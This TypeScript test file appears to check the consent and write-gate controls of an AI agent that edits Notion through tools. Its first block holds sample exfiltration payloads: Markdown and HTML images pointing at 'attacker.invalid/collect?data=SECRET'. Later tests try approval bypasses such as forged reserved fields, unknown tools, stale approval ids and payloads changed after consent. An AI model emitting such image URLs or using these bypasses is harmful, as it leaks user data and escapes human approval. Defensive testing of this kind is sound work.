// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { renderMarkdown } from '../src/lib/markdown'
import { validateEffect } from '../src/lib/writes/effects'
import { ApprovalEngine, evaluateApproval } from '../src/lib/writes/approvals'
import { PlanEngine, type PlanScope } from '../src/lib/architect/plan-engine'
import { recordRetrievals } from '../src/lib/agent/retrievals'
import { WriteGate } from '../src/lib/writes/gate'
import { MutationJournal } from '../src/lib/writes/journal'
import { Scheduler, UncertainDispatchError } from '../src/lib/mcp/scheduler'
import { McpHttpError } from '../src/lib/mcp/client'
import { ToolExecutor, DEFAULT_STEP_LIMIT } from '../src/lib/agent/executor'
import { createTurnAccessState } from '../src/lib/agent/turn-access'
import type { Mode } from '../src/lib/writes/approvals'

// Epoch 17.1 — integrated adversarial acceptance over production assembly.
// Each High finding maps to a deterministic regression below; the consent
// matrix re-runs with real PlanEngine + ApprovalEngine + WriteGate +
// MutationJournal + Scheduler entry points. External transports are faked at
// the boundary; no production component is mocked away.

const PAGE = 'c'.repeat(32)
const DB = '11111111-2222-3333-4444-555555555555'
const DB_OTHER = '22222222-3333-4444-5555-666666666666'

function propertiesArgs(page = PAGE): Record<string, unknown> {
  return { data: { page_id: page }, command: { type: 'update_properties', properties: {} } }
}

function makeGate(over: {
  mode?: Mode
  grant?: { allowed: boolean; pages: string[] }
  owner?: boolean
  journal?: MutationJournal
  contextPages?: string[]
  callTool?: (name: string, args: Record<string, unknown>) => Promise<{ content: Array<{ type: string; text?: string }>; isError?: boolean }>
  authorizeStructuralChange?: (effect: ReturnType<typeof validateEffect>, scope: PlanScope) => { allowed: boolean; reason?: string; reservationId?: string }
  checkPlanReservation?: (id: string, scope: PlanScope) => boolean
  consumePlanReservation?: (id: string, resultText?: string) => void
  workspaceId?: string | null
  connGen?: string | null
} = {}) {
  const calls: Array<{ name: string; args: Record<string, unknown> }> = []
  const journal = over.journal ?? new MutationJournal()
  journal.setThread('thread-acceptance')
  const access = createTurnAccessState()
  access.begin(over.mode ?? 'ask', over.contextPages ?? [PAGE], [], over.grant ?? { allowed: false, pages: [] })
  const owner = over.owner ?? true
  const connGen = over.connGen ?? 'conn-acceptance'
  const gate = new WriteGate({
    callTool:
      over.callTool ??
      (async (name, args) => {
        calls.push({ name, args })
        return { content: [{ type: 'text', text: `ran ${name}` }] }
      }),
    fetchPageMarkdown: async () => '# Simple\noriginal text',
    getMode: () => access.mode(),
    getContextSet: () => access.contextPages(),
    journal,
    getSmallEditGrant: () => access.smallEditGrant(),
    recordUnplannedEffects: (count) => access.recordUnplannedEffects(count),
    authorizeStructuralChange: over.authorizeStructuralChange,
    checkPlanReservation: over.checkPlanReservation,
    consumePlanReservation: over.consumePlanReservation,
    ownership: {
      isOwner: () => owner,
      getOwnerGeneration: () => 'owner-acceptance',
      getConnectionGeneration: () => connGen,
    },
    getWorkspaceId: () => (over.workspaceId === undefined ? 'ws-acceptance' : over.workspaceId),
  })
  return { gate, journal, calls, access }
}

function structuralPlan(db = DB) {
  return {
    goal: 'Track habits in the existing log',
    recommendation: 'Reuse the Daily Log data source',
    evidence: [{ id: db, title: 'Daily Log', kind: 'database' as const, reason: 'Already stores dated records' }],
    operations: [{ tool: 'notion-update-data-source', targetId: db, args: { data_source_id: db }, summary: 'Add Completed checkbox' }],
    consequences: ['One database schema changes'],
  }
}



describe('H1 — rendered answers never auto-load remote resources', () => {
  it('converts Markdown images to clickable links with no autoload sink', () => {
    const html = renderMarkdown('![preview](https://attacker.invalid/collect?data=SECRET)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('src=')
    expect(html).toContain('https://attacker.invalid/collect?data=SECRET')
    expect(html).toContain('<a')
    expect(html).toContain('preview')
  })

  it('removes raw media sinks while ordinary links stay clickable', () => {
    const html = renderMarkdown(
      [
        '[docs](https://example.com/page)',
        '',
        '<img src="https://attacker.invalid/x.png">',
        '',
        '<picture><source srcset="https://attacker.invalid/a.png 1x"><img src="https://attacker.invalid/f.png"></picture>',
        '',
        '<video poster="https://attacker.invalid/p.png"></video>',
      ].join('\n'),
    )
    expect(html).not.toMatch(/<img/i)
    expect(html).not.toMatch(/<picture/i)
    expect(html).not.toMatch(/<source/i)
    expect(html).not.toContain('src=')
    expect(html).not.toContain('srcset')
    expect(html).not.toContain('poster=')
    expect(html).toContain('href="https://example.com/page"')
  })
})

describe('H2 — plans never grant themselves authority; scope is exact and one-use', () => {
  it('blocks structural work until the exact operation is approved, then consumes it once', async () => {
    const threadId = 'thread-h2-exact'
    recordRetrievals(threadId, [DB])
    let pending: { id: string; resolve: (d: 'approved' | 'rejected') => void } | null = null
    const engine = new PlanEngine((p) => void (pending = { id: p.id, resolve: p.resolve }))
    const scope: PlanScope = { workspaceId: 'ws-acceptance', connectionGeneration: 'conn-1', threadId, turnId: 'turn-1' }
    engine.beginTurn('turn-1')
    const effect = validateEffect('notion-update-data-source', { data_source_id: DB })
    expect(engine.authorize(effect, scope).allowed).toBe(false)
    const requested = engine.request(structuralPlan(), scope)
    expect(pending).not.toBeNull()
    engine.answer(pending!.id, 'approved')
    await expect(requested).resolves.toBe('approved')
    const grant = engine.authorize(effect, scope)
    expect(grant.allowed).toBe(true)
    expect(grant.reservationId).toBeTruthy()
    expect(engine.checkReservation(grant.reservationId!, scope)).toBe(true)
    expect(engine.consume(grant.reservationId!)).toBe(true)
    // Reuse of the same payload requires a separately listed operation.
    expect(engine.authorize(effect, scope).allowed).toBe(false)
    // A materially different target is a deviation, not a match.
    const other = validateEffect('notion-update-data-source', { data_source_id: DB_OTHER })
    expect(engine.authorize(other, scope).allowed).toBe(false)
    // A stale connection/turn scope fails closed.
    expect(engine.authorize(effect, { ...scope, connectionGeneration: 'conn-2' }).allowed).toBe(false)
    expect(engine.authorize(effect, { ...scope, turnId: 'turn-2' }).allowed).toBe(false)
  })

  it('treats omitted targets as incomplete scope, never a wildcard', () => {
    expect(() => validateEffect('notion-update-data-source', {})).toThrow(/data-source target/)
    expect(() => validateEffect('notion-move-pages', {})).toThrow(/requires at least one moved page/)
  })

  it('an approved plan covers its exact operation through the gate without a redundant card, and nothing else', async () => {
    const journal = new MutationJournal()
    journal.setThread('thread-h2-gate')
    const scope = {
      workspaceId: 'ws-acceptance',
      connectionGeneration: 'conn-acceptance',
      threadId: 'thread-h2-gate',
      turnId: journal.captureScope().turnId,
    } as PlanScope
    recordRetrievals('thread-h2-gate', [DB])
    let pending: { id: string; resolve: (d: 'approved' | 'rejected') => void } | null = null
    const engine = new PlanEngine((p) => void (pending = { id: p.id, resolve: p.resolve }))
    engine.beginTurn(scope.turnId ?? 'turn-1')
    const requested = engine.request(structuralPlan(), scope)
    engine.answer(pending!.id, 'approved')
    await expect(requested).resolves.toBe('approved')
    const calls: Array<{ name: string; args: Record<string, unknown> }> = []
    const access = createTurnAccessState()
    access.begin('auto', [DB], [], { allowed: false, pages: [] })
    const gate = new WriteGate({
      callTool: async (name, args) => {
        calls.push({ name, args })
        return { content: [{ type: 'text', text: `ran ${name}` }] }
      },
      fetchPageMarkdown: async () => '# Simple\noriginal text',
      getMode: () => access.mode(),
      getContextSet: () => access.contextPages(),
      journal,
      getSmallEditGrant: () => access.smallEditGrant(),
      recordUnplannedEffects: (c) => access.recordUnplannedEffects(c),
      authorizeStructuralChange: (effect, s) => engine.authorize(effect, s),
      checkPlanReservation: (id, s) => engine.checkReservation(id, s),
      consumePlanReservation: (id, text) => void engine.consume(id, text),
      ownership: {
        isOwner: () => true,
        getOwnerGeneration: () => 'owner-acceptance',
        getConnectionGeneration: () => 'conn-acceptance',
      },
      getWorkspaceId: () => 'ws-acceptance',
    })
    const out = (await gate.handle({
      rid: 1,
      tool: 'notion-update-data-source',
      args: { data_source_id: DB },
      namespace: null,
    })) as { content: Array<{ text: string }> }
    expect(out.content[0].text).toContain('ran notion-update-data-source')
    expect(calls).toHaveLength(1)
    expect(gate.approvals.pendingCount).toBe(0)
    const repeat = (await gate.handle({
      rid: 2,
      tool: 'notion-update-data-source',
      args: { data_source_id: DB },
      namespace: null,
    })) as { isError?: boolean; content: Array<{ text?: string }> }
    expect(repeat.isError).toBe(true)
    expect(repeat.content[0].text).toMatch(/PLAN_MISMATCH|PLAN_REQUIRED/)
    expect(calls).toHaveLength(1)
  })
})

describe('H3 — consent binds to the complete frozen payload', () => {
  it('dispatches the frozen snapshot even when the live request object changes', async () => {
    const { gate, calls } = makeGate({ mode: 'ask' })
    const args: Record<string, unknown> = {
      data: { page_id: PAGE },
      command: { type: 'update_properties', properties: { keep: 1 } },
    }
    const pending = gate.handle({ rid: 60, tool: 'notion-update-page', args, namespace: null })
    await new Promise((r) => setTimeout(r, 10))
    expect(gate.approvals.pendingCount).toBe(1)
    ;(args.command as Record<string, unknown>).properties = { swapped: 2 }
    args.extra = 'late-target'
    gate.approvals.answer(gate.approvals.pendingIds[0], 'approve')
    await pending
    expect(calls).toHaveLength(1)
    expect(calls[0].args).toEqual({
      data: { page_id: PAGE },
      command: { type: 'update_properties', properties: { keep: 1 } },
    })
  })

  it('keeps the full payload inspectable past the old 2,000-character cutoff', async () => {
    const longContent = 'x'.repeat(3000)
    const call = {
      name: 'notion-update-page',
      args: { data: { page_id: PAGE }, command: { type: 'update_properties', properties: { note: longContent } }, trailing: 'must-stay-visible' },
      mutates: true as const,
      kind: 'properties' as const,
      targets: [PAGE],
      parents: [],
      affectedCount: 1,
      grant: { allowed: false, pages: [] },
    }
    let display: { payloadJson: string } | null = null
    const notifying = new ApprovalEngine((d) => void (display = d))
    const pending = notifying.request(call, { action: 'require-approval', reasons: ['ask-before-changes mode is on'] })
    await new Promise((r) => setTimeout(r, 0))
    notifying.answer((display as unknown as { id: number }).id, 'approve')
    await pending
    expect((display as unknown as { payloadJson: string }).payloadJson).toContain('must-stay-visible')
    expect((display as unknown as { payloadJson: string }).payloadJson.length).toBeGreaterThan(2000)
  })

  it('rejects stale/double answers and refuses reserved, unknown, and oversize proposals before any card', async () => {
    const { gate, calls, journal } = makeGate({ mode: 'ask' })
    expect(gate.approvals.answer(999999, 'approve')).toBe(false)
    for (const [tool, args, pattern] of [
      ['notion-update-page', { ...propertiesArgs(), __nox_expected_hash: 'forged' }, /INVALID_ARGUMENTS/],
      ['notion-frobnicate', { id: PAGE }, /UNSUPPORTED_EFFECT/],
      ['notion-create-file-upload', { attachment_id: 'a1' }, /UNSUPPORTED_EFFECT/],
      ['notion-update-page', { data: { page_id: PAGE }, command: { type: 'replace_content', content: 'x'.repeat(600 * 1024) } }, /PAYLOAD_TOO_LARGE/],
    ] as Array<[string, Record<string, unknown>, RegExp]>) {
      const out = (await gate.handle({ rid: 70, tool, args, namespace: null })) as { isError?: boolean; content: Array<{ text?: string }> }
      expect(out.isError).toBe(true)
      expect(out.content[0].text).toMatch(pattern)
    }
    expect(calls).toHaveLength(0)
    expect(gate.approvals.pendingCount).toBe(0)
    expect(await journal.newestFirst()).toHaveLength(0)
  })
})

describe('H4 — one runtime owner; viewers cannot write', () => {
  it('viewer writes and viewer undo make zero transport calls', async () => {
    const { gate, calls } = makeGate({ owner: false })
    const out = (await gate.handle({ rid: 1, tool: 'notion-update-page', args: propertiesArgs(), namespace: null })) as {
      isError?: boolean
      content: Array<{ text?: string }>
    }
    expect(out.isError).toBe(true)
    expect(out.content[0].text).toMatch(/NOT_OWNER/)
    await expect(gate.handleUndo('notion-update-page', {})).rejects.toThrow(/NOT_OWNER/)
    expect(calls).toHaveLength(0)
  })

  it('undo waits while a turn is active and turns wait while undo holds the runner', async () => {
    const { gate, calls } = makeGate()
    gate.beginTurn()
    await expect(
      gate.handleUndo('notion-update-page', { data: { page_id: PAGE }, command: { type: 'update_properties', properties: {} } }),
    ).rejects.toThrow(/TURN_ACTIVE/)
    expect(calls).toHaveLength(0)
    gate.endTurn()
    await gate.handleUndo('notion-update-page', { data: { page_id: PAGE }, command: { type: 'update_properties', properties: {} } })
    expect(calls).toHaveLength(1)
  })
})

describe('H5 — ambiguous failures never replay; uncertainty is durable', () => {
  it('a non-retryable mutation runs exactly once and surfaces uncertainty', async () => {
    const scheduler = new Scheduler({ now: () => 0, sleep: async () => undefined })
    let commits = 0
    const failure = scheduler.schedule('global', async () => {
      commits++
      throw new McpHttpError(503, 'committed before failing')
    })
    await expect(failure).rejects.toBeInstanceOf(UncertainDispatchError)
    expect(commits).toBe(1)
  })

  it('the gate settles an uncertain dispatch as unknown with one journal row and no retry', async () => {
    const uncertain = new UncertainDispatchError('mcp http 503: committed before failing')
    let dispatches = 0
    const { gate, journal } = makeGate({
      mode: 'auto',
      grant: { allowed: true, pages: [PAGE] },
      callTool: async () => {
        dispatches++
        throw uncertain
      },
    })
    await expect(
      gate.handle({ rid: 30, tool: 'notion-update-page', args: propertiesArgs(), namespace: null }),
    ).rejects.toBe(uncertain)
    expect(dispatches).toBe(1)
    const entries = await journal.newestFirst()
    expect(entries).toHaveLength(1)
    expect(entries[0].status).toBe('unknown')
  })
})

describe('consent matrix with production entry points', () => {
  it('reads need no plan and no action card', async () => {
    const { gate, journal, calls } = makeGate()
    const out = (await gate.handle({ rid: 1, tool: 'notion-fetch', args: { id: PAGE }, namespace: null })) as {
      content: Array<{ text: string }>
    }
    expect(out.content[0].text).toContain('ran notion-fetch')
    expect(calls).toHaveLength(1)
    expect(gate.approvals.pendingCount).toBe(0)
    expect(await journal.newestFirst()).toHaveLength(0)
  })

  it('one small Ask edit presents one card with the complete payload; rejection writes nothing', async () => {
    const { gate, calls } = makeGate({ mode: 'ask' })
    const pending = gate.handle({ rid: 2, tool: 'notion-update-page', args: propertiesArgs(), namespace: null })
    await new Promise((r) => setTimeout(r, 10))
    expect(gate.approvals.pendingCount).toBe(1)
    gate.approvals.answer(gate.approvals.pendingIds[0], 'reject')
    const out = (await pending) as { isError?: boolean; content: Array<{ text?: string }> }
    expect(out.isError).toBe(true)
    expect(calls).toHaveLength(0)
  })

  it('Auto without the grant asks; granted in-context small edits skip the redundant card; out-of-scope still asks', async () => {
    const ungranted = makeGate({ mode: 'auto', grant: { allowed: false, pages: [] } })
    const needsCard = ungranted.gate.handle({ rid: 3, tool: 'notion-update-page', args: propertiesArgs(), namespace: null })
    await new Promise((r) => setTimeout(r, 10))
    expect(ungranted.gate.approvals.pendingCount).toBe(1)
    ungranted.gate.approvals.answer(ungranted.gate.approvals.pendingIds[0], 'reject')
    await needsCard
    expect(ungranted.calls).toHaveLength(0)

    const granted = makeGate({ mode: 'auto', grant: { allowed: true, pages: [PAGE] }, contextPages: [PAGE] })
    const silent = (await granted.gate.handle({ rid: 4, tool: 'notion-update-page', args: propertiesArgs(), namespace: null })) as {
      content: Array<{ text: string }>
    }
    expect(silent.content[0].text).toContain('ran notion-update-page')
    expect(granted.calls).toHaveLength(1)
    expect(granted.gate.approvals.pendingCount).toBe(0)

    const outOfScope = makeGate({ mode: 'auto', grant: { allowed: true, pages: [PAGE] }, contextPages: [DB_OTHER] })
    const scoped = outOfScope.gate.handle({ rid: 5, tool: 'notion-update-page', args: propertiesArgs(), namespace: null })
    await new Promise((r) => setTimeout(r, 10))
    expect(outOfScope.gate.approvals.pendingCount).toBe(1)
    outOfScope.gate.approvals.answer(outOfScope.gate.approvals.pendingIds[0], 'reject')
    await scoped
    expect(outOfScope.calls).toHaveLength(0)
  })

  it('direct bypass attempts fail closed: unknown tools, raw ticket routes, reserved fields, stale approvals', async () => {
    const { gate, calls } = makeGate({ mode: 'auto', grant: { allowed: true, pages: [PAGE] } })
    for (const tool of ['notion-frobnicate', 'notion-create-file-upload', 'nox-upload-local-file']) {
      const out = (await gate.handle({ rid: 80, tool, args: { id: PAGE }, namespace: null })) as {
        isError?: boolean
        content: Array<{ text?: string }>
      }
      expect(out.isError).toBe(true)
      expect(out.content[0].text).toMatch(/UNSUPPORTED_EFFECT/)
    }
    const reserved = (await gate.handle({
      rid: 81,
      tool: 'notion-update-page',
      args: { ...propertiesArgs(), __nox_expected_hash: 'x' },
      namespace: null,
    })) as { isError?: boolean; content: Array<{ text?: string }> }
    expect(reserved.isError).toBe(true)
    // A stale approval id never authorizes anything.
    expect(gate.approvals.answer(424242, 'approve')).toBe(false)
    expect(calls).toHaveLength(0)
  })

  it('local and unknown tools never reach transport through the executor boundary', async () => {
    const calls: string[] = []
    const executor = new ToolExecutor({
      callTool: async (name) => {
        calls.push(name)
        return { content: [{ type: 'text', text: 'ok' }] }
      },
      assertToolAllowed: (name) => {
        if (name === 'notion-query-meeting-notes') throw new Error(`TOOL_UNAVAILABLE: "${name}"`)
      },
    })
    const out = await executor.execute({ rid: 1, tool: 'notion-query-meeting-notes', args: {}, namespace: null })
    expect(out.contentItems[0].text).toMatch(/TOOL_UNAVAILABLE/)
    expect(calls).toHaveLength(0)
  })
})

describe('strong behavior locks (sampled; full matrix maps to existing suites)', () => {
  it('tool calls stay bounded at the 12-call ceiling with no extra dispatch', async () => {
    const calls: string[] = []
    const executor = new ToolExecutor({
      callTool: async (name) => {
        calls.push(name)
        return { content: [{ type: 'text', text: 'ok' }] }
      },
      assertToolAllowed: () => undefined,
    })
    for (let i = 0; i < DEFAULT_STEP_LIMIT; i++) {
      await executor.execute({ rid: i, tool: 'notion-search', args: {}, namespace: null })
    }
    expect(executor.stepsTaken).toBe(DEFAULT_STEP_LIMIT)
    const refused = await executor.execute({ rid: 99, tool: 'notion-search', args: {}, namespace: null })
    expect(refused.success).toBe(false)
    expect(refused.contentItems[0].text).toMatch(/STEP_LIMIT_REACHED/)
    expect(calls).toHaveLength(DEFAULT_STEP_LIMIT)
  })

  it('continuation handles expire on the next turn', async () => {
    const executor = new ToolExecutor({
      callTool: async () => ({ content: [{ type: 'text', text: `${'x'.repeat(25000)}DECISION: ship` }] }),
      assertToolAllowed: () => undefined,
    })
    executor.beginTurn()
    const result = await executor.execute({ tool: 'notion-fetch', args: {}, rid: 1, namespace: null })
    const handle = /handle="([^"]+)"/.exec(result.contentItems[0].text)![1]
    const request = { tool: 'nox-read-continuation', args: { handle, offset: 24000 }, rid: 2, namespace: null }
    const next = await executor.execute(request)
    expect(next.contentItems[0].text).toContain('DECISION: ship')
    executor.beginTurn()
    expect((await executor.execute(request)).success).toBe(false)
  })

  it('evaluateApproval keeps untrusted and out-of-context edits on the card path even with the Auto grant', () => {
    const granted = { allowed: true, pages: [PAGE] }
    const verdict = evaluateApproval(
      {
        name: 'notion-update-page',
        args: propertiesArgs(),
        mutates: true,
        kind: 'properties',
        targets: [PAGE],
        parents: [],
        affectedCount: 1,
        grant: granted,
        provenance: 'untrusted-context',
      },
      { mode: 'auto', contextSet: new Set([PAGE]) },
    )
    expect(verdict.action).toBe('require-approval')
  })
})
